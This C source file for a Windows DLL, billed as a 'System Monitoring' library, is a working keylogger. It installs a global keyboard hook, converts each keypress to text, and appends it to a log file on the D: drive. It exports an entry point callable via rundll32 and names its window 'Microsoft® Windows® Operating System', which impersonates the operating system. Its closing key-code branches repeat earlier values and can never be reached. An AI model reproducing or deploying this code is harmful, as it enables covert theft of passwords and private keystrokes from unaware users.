
// Library for System Monitoring
// Written by Arjun Menon

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

/*********************.
| Function Prototypes |
`*********************/

int WINAPI StartSystem(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		WPARAM wParam,LPARAM lParam);
int WINAPI DllMain(HANDLE hModule,
DWORD ul_reason_for_call, LPVOID lpReserved);
__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
HHOOK StartSensing();
LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam);
void DescribeKey(WPARAM wParam, char *keyw);
void WriteToFile(char *str);

/******************.
| Global Variables |
`******************/

static char szAppName[] = "Microsoft® Windows® Operating System";
HANDLE hDLL = NULL;

/*********.
| Program |
`*********/

int WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;
	 LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		 WPARAM wParam, LPARAM lParam);

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (szAppName, szAppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		DeleteFile("d:\\log.txt");
		StartSensing();
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

int WINAPI DllMain(HANDLE hModule,
				   DWORD ul_reason_for_call,
				   LPVOID lpReserved)
{
	hDLL = hModule;

	return TRUE;
}

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartSystem((HINSTANCE)hDLL, NULL, "", SW_NORMAL);
}

HHOOK StartSensing()
{
	return SetWindowsHookEx(WH_KEYBOARD,
	(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,NULL);
}

void WriteToFile(char *str)
{
	if(!str) return;
	HANDLE hFile; 
	DWORD  nFile; 
	
	hFile = CreateFile("d:\\log.txt", GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return;

	SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, str, strlen(str), &nFile, NULL);
	CloseHandle(hFile);
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	/* The 32nd bit of lParam tells us if 
	   the key is being pressed or released */
	if(!(lParam >> 31))
	{
		MessageBeep(-1);
		char *keyw = (char *)calloc(30, sizeof(char));
		DescribeKey(wParam, keyw);

		/* The first 16 bits of lParam tells
		   us how long the key was pressed */
		UINT repeat = (lParam << 16) >> 16;
		if(!repeat) repeat = 1;
		char *key = (char *) calloc
		((repeat * strlen(keyw))+1, sizeof(char));
		if(key == NULL)
			goto exit_point;
		while(repeat--)
			strcat(key, keyw);

		if(key)
			WriteToFile(key);
	exit_point:
		free(keyw);
		free(key);
	}

	return CallNextHookEx(NULL, code, wParam, lParam);
}

void DescribeKey(WPARAM wParam, char *keyw)
{
	char vkc = 0; /* virtual key code */

	vkc = /* maintain alphabet case */
		((GetKeyState(VK_SHIFT) < 0)&&(
		!(GetKeyState(VK_CAPITAL) < 0)))
		? toupper((char)(wParam))
		: tolower((char)(wParam));

	/* numeric pad keys 0 to 10 */
	if((wParam >= 0x60)&&
	   (wParam <= 0x69))
		wParam -= 0x30;

	/* keys from 0 to 9 , A to Z and space */
	if(((wParam >= 0x30) 
	  &&(wParam <= 0x5A)) 
	  ||(wParam == 0x20))
	{
		keyw[0] = vkc;
		keyw[1] = 0;
	}

	else if(wParam == 0x03)
		strcpy(keyw,"[CTRL-BRK]");
	else if(wParam == 0x08)
		strcpy(keyw,"[BACK]");
	else if(wParam == 0x09)
		strcpy(keyw,"[TAB]");
	else if(wParam == 0x0C)
		strcpy(keyw,"[CLEAR]");
	else if(wParam == 0x0D)
		strcpy(keyw,"[ENTER]\r\n");
	else if(wParam == 0x10)
		strcpy(keyw,"[SHIFT]");
	else if(wParam == 0x11)
		strcpy(keyw,"[CTRL]");
	else if(wParam == 0x12)
		strcpy(keyw,"[ALT]");
	else if(wParam == 0x13)
		strcpy(keyw,"[PAUSE]");
	else if(wParam == 0x14)
		strcpy(keyw,"[CapsLock]");
	else if(wParam == 0x1B)
		strcpy(keyw,"[ESC]");
	else if(wParam == 0x21)
		strcpy(keyw,"[PageUp]");
	else if(wParam == 0x22)
		strcpy(keyw,"[PageDown]");
	else if(wParam == 0x23)
		strcpy(keyw,"[END]");
	else if(wParam == 0x24)
		strcpy(keyw,"[HOME]");
	else if(wParam == 0x25)
		strcpy(keyw,"[LEFT]");
	else if(wParam == 0x26)
		strcpy(keyw,"[UP]");
	else if(wParam == 0x27)
		strcpy(keyw,"[RIGHT]");
	else if(wParam == 0x28)
		strcpy(keyw,"[DOWN]");
	else if(wParam == 0x29)
		strcpy(keyw,"[SELECT]");
	else if(wParam == 0x2B)
		strcpy(keyw,"[EXECUTE]");
	else if(wParam == 0x2C)
		strcpy(keyw,"[PrintScreen]");
	else if(wParam == 0x2D)
		strcpy(keyw,"[INSERT]");
	else if(wParam == 0x2E)
		strcpy(keyw,"[DELETE]");
	else if(wParam == 0x2F)
		strcpy(keyw,"[HELP]");
	else if(wParam == 0x5B)
		strcpy(keyw,"[LeftWindowsKey]");
	else if(wParam == 0x5C)
		strcpy(keyw,"[RightWindowsKey]");
	else if(wParam == 0x5D)
		strcpy(keyw,"[ApplicationKey]");
	else if(wParam == 0x6A)
		strcpy(keyw,"[MULTIPLY]");
	else if(wParam == 0x6B)
		strcpy(keyw,"[ADD]");
	else if(wParam == 0x6C)
		strcpy(keyw,"[SEPERATOR]");
	else if(wParam == 0x6D)
		strcpy(keyw,"[SUBTRACT]");
	else if(wParam == 0x6E)
		strcpy(keyw,"[DECIMAL]");
	else if(wParam == 0x6F)
		strcpy(keyw,"[DIVIDE]");
	else if(wParam == 0x70)
		strcpy(keyw,"[F1]");
	else if(wParam == 0x71)
		strcpy(keyw,"[F2]");
	else if(wParam == 0x72)
		strcpy(keyw,"[F3]");
	else if(wParam == 0x73)
		strcpy(keyw,"[F4]");
	else if(wParam == 0x74)
		strcpy(keyw,"[F5]");
	else if(wParam == 0x75)
		strcpy(keyw,"[F6]");
	else if(wParam == 0x76)
		strcpy(keyw,"[F7]");
	else if(wParam == 0x77)
		strcpy(keyw,"[F8]");
	else if(wParam == 0x78)
		strcpy(keyw,"[F9]");
	else if(wParam == 0x79)
		strcpy(keyw,"[F10]");
	else if(wParam == 0x7A)
		strcpy(keyw,"[F11]");
	else if(wParam == 0x7B)
		strcpy(keyw,"[F12]");
	else if(wParam == 0x7C)
		strcpy(keyw,"[F13]");
	else if(wParam == 0x7D)
		strcpy(keyw,"[F14]");
	else if(wParam == 0x7E)
		strcpy(keyw,"[F15]");
	else if(wParam == 0x7F)
		strcpy(keyw,"[F16]");
	else if(wParam == 0x90)
		strcpy(keyw,"[NumLock]");
	else if(wParam == 0x91)
		strcpy(keyw,"[ScrollLock]");
	else if(wParam == 0xF6)
		strcpy(keyw,"[ATTN]");
	else if(wParam == 0xF7)
		strcpy(keyw,"[CrSel]");
	else if(wParam == 0xF8)
		strcpy(keyw,"[ExSel]");
	else if(wParam == 0x79)
		strcpy(keyw,"[EraseEOF]");
	else if(wParam == 0x7A)
		strcpy(keyw,"[PLAY]");
	else if(wParam == 0x7B)
		strcpy(keyw,"[ZOOM]");
}